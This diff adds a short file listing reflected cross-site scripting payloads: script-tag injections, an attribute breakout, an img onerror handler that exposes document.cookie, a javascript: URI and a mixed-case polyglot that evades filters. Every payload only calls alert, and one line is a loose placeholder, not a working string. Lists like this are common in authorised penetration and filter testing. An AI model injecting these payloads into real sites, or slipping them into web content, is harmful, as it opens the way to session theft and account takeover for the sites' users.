@@ -1,0 +1,7 @@
+# Top Reflected XSS Payloads (2025 Edition)
+<script>alert('Reflected XSS')</script>
+"><script>alert(1)</script>
+<img src=x onerror=alert(document.cookie)>
+javascript:alert('XSS')
+event=alert(1) on<event> (e.g., onload=alert(1))
+# Polyglot: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
